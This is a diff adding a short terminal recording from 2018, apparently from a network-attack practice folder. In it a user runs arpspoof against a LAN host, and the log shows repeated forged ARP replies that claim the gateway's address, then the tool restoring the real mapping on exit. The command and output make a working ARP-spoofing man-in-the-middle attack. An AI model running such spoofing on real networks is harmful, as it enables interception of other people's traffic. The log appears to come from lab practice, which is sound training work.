@@ -1,0 +1,21 @@
+Script started on 2018-04-01 16:44:24-0300
+]0;prizefighter@prizefighter: ~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[01;31mprizefighter@prizefighter[00m:[01;34m~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[00m$ exitsudo arpsspoof -i wlan0 -t 192.168.0.60 192.168.0.1[C
+[sudo] password for prizefighter: 
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 9c:da:3e:db:0:9c
+^CCleaning up and re-arping targets...
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 28:be:9b:6f:c7:a8
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 28:be:9b:6f:c7:a8
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 28:be:9b:6f:c7:a8
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 28:be:9b:6f:c7:a8
+9c:da:3e:db:0:9c b0:47:bf:bc:8a:f1 0806 42: arp reply 192.168.0.1 is-at 28:be:9b:6f:c7:a8
+]0;prizefighter@prizefighter: ~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[01;31mprizefighter@prizefighter[00m:[01;34m~/lehfscratch/7sec-NPT-PostAcsAtk/mitm[00m$ exit
+exit
+
+Script done on 2018-04-01 16:45:50-0300
